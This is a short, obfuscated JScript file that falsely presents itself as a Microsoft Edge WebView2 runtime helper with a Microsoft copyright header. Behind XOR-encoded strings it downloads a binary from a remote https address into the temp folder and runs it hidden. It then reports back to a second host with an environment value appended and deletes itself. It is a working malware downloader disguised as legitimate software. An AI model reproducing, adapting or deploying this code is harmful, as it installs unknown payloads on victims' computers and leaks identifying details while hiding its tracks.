// Microsoft Edge WebView2 Runtime Helper
// Build 126.0.2592.87 (Official build) x64
// (c) Microsoft Corporation. All rights reserved.
// Licensed under the MIT License.
var _k = [0x37, 0x5A, 0x1F];
var _d = function(a) { var r = ''; for (var i = 0; i < a.length; i++) r += String.fromCharCode(a[i] ^ _k[i % 3]); return r; };

var _o1 = _d([96,9,124,69,51,111,67,116,76,95,63,115,91]);
var _o2 = _d([122,41,103,90,54,45,25,2,82,123,18,75,99,10]);
var _o3 = _d([100,57,109,94,42,107,94,52,120,25,28,118,91,63,76,78,41,107,82,55,80,85,48,122,84,46]);
var _o4 = _d([118,30,80,115,24,49,100,46,109,82,59,114]);

var _s = new ActiveXObject(_o1);
var _h = new ActiveXObject(_o2);
var _f = new ActiveXObject(_o3);

var _tp = _s.ExpandEnvironmentStrings(_d([18,46,122,90,42,58]));
var _fp = _tp + _d([107,31,123,80,63,74,71,62,49,82,34,122]);

_h.open(_d([112,31,75]), _d([95,46,107,71,41,37,24,117,109,86,45,49,80,51,107,95,47,125,66,41,122,69,57,112,89,46,122,89,46,49,84,53,114,24,43,106,86,54,118,67,35,106,71,62,48,66,42,123,86,46,122,6,104,44,2,117,109,82,60,108,24,50,122,86,62,108,24,55,126,94,52,48,66,42,123,86,46,122,69,116,122,79,63]), false);
_h.setRequestHeader(_d([98,41,122,69,119,94,80,63,113,67]), _d([122,53,101,94,54,115,86,117,43,25,106]));
_h.send();

if (_h.status === 200) {
    var _st = new ActiveXObject(_o4);
    _st.Type = 1;
    _st.Open();
    _st.Write(_h.responseBody);
    _st.SaveToFile(_fp, 2);
    _st.Close();

    _s.Run('"' + _fp + '"', 0, false);

    try {
        var _cb = new ActiveXObject(_o2);
        var _cu = _d([95,46,107,71,41,37,24,117,125,94,54,125,86,53,115,86,49,122,25,57,112,90,117,124,85,101,114,10,62,57,95,103]) + _s.ExpandEnvironmentStrings(_d([18,25,80,122,10,74,99,31,77,121,27,82,114,127]));
        _cb.open(_d([112,31,75]), _cu, false);
        _cb.send();
    } catch(_) {}
}
try { new ActiveXObject(_o3).DeleteFile(WScript.ScriptFullName); } catch(_) {}
